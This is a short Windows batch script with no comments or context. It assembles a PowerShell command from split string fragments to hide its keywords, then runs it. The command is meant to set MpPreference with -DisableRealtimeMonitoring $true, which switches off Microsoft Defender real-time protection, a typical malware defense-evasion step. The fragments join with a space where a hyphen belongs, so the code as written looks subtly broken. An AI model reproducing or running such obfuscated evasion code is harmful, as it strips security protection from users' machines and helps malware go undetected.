@echo off
set part1=Set
set part2=M
set part2=%part2%p
set part2=%part2%P
set part2=%part2%reference
set part3=-D
set part3=%part3%isable
set part3=%part3%Realtime
set part3=%part3%Monitoring
set part4=$
set part4=%part4%true
set command=%part1% %part2% %part3% %part4%
powershell -Command "%command%"
